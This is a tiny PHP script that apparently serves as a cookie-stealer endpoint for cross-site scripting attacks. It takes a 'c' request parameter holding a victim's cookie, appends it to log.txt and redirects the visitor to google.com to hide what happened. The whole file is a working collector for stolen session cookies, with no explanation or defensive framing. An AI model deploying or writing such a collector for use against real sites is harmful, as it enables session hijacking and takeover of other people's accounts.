<?php 
$logFile = "log.txt"; 
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a"); 
fwrite($handle, $cookie . "\n\n"); 
fclose($handle);

header("Location: http://www.google.com/"); 
exit; 
?>
